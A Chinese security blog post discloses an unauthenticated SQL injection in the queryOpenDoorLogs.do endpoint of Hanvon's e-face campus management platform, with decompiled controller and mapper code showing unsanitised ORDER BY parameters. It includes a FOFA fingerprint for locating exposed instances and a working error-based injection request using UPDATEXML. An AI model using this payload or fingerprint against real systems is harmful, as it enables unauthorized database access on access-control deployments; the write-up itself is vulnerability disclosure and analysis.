---
title: "汉王e脸通综合管理平台 queryOpenDoorLogs.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryOpenDoorLogs-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-queryopendoorlogs.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryOpenDoorLogs.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/26 08:29
- 819浏览
- [0评论](#comment)
- 33分钟阅读

深入探索

鉴权

安全

身份验证

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryOpenDoorLogs.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `OpenDoorLogController` 里关于 `queryOpenDoorLogs` 的实现

```
@ResponseBody
@RequestMapping(
    value = {"/queryOpenDoorLogs.do"},
    method = {RequestMethod.POST}
)
public RequestJson queryOpenDoorLogs(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "name") String name, @RequestParam(required = false,value = "begin") String begin, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "userId") Long userId, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
    RequestJson result = new RequestJson();

    try {
        DbPager pager = this.getPager(page, pageSize, columnKey, order);
        if (userId == null) {
            SessionalUser su = TheApp.getCurrentUser();
            userId = su.getId();
        }

        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        if (begin == null || end == null) {
            Calendar cale = Calendar.getInstance();
            cale.add(2, 0);
            cale.set(5, 1);
            begin = sdf.format(cale.getTime());
            cale.add(2, 1);
            cale.set(5, 0);
            end = sdf.format(cale.getTime());
        }

        Date begin1 = sdf.parse(begin);
        Date end1 = sdf.parse(end);
        begin1 = WorkDateUtils.getStartOfDay(begin1);
        end1 = WorkDateUtils.getEndOfDay(end1);
        Timestamp beginTime = new Timestamp(begin1.getTime());
        Timestamp endTime = new Timestamp(end1.getTime());
        if (name != null && name.trim().length() > 0) {
            name.trim();
        }

        List<OpenDoorLogTpm> list = (List)this.openDoorLogAsm.queryOpenDoorLog(beginTime, endTime, name, userId, pager).getResult();
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 OpenDoorLogDsm.xml

代码安全审计

```
<select id="queryOpenDoorLog" resultType="openDoorLogTpm">
        <include refid="com.hanvon.iface.dsm.common.Common.pager_head"/>
        <choose>
            <when test="pager != null and pager.dbSorts != null and pager.dbSorts.size()>0">
                <foreach item="item" collection="pager.dbSorts" open="order by " separator=",">
                    ${item.sortField} ${item.sortMode}
                </foreach>
            </when>
            <otherwise>
                order by ol.ts_create desc
            </otherwise>
        </choose>
```

深入探索

编程语言教程

技术文章订阅

网络安全课程

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /manage/openDoorLog/queryOpenDoorLogs.do HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: application/x-www-form-urlencoded

columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT (ELT(2920=2920,1)))),8357))&id=1&order=desc&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS
```

[![汉王e脸通综合管理平台 queryOpenDoorLogs.do SQL注入漏洞](images/img-001-277944e2f809.webp)](https://image.mrxn.net/e8b4f467287349fba39b8cd2b943c7f5.webp)

成功利用报错注入获取到数据库版本号信息

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
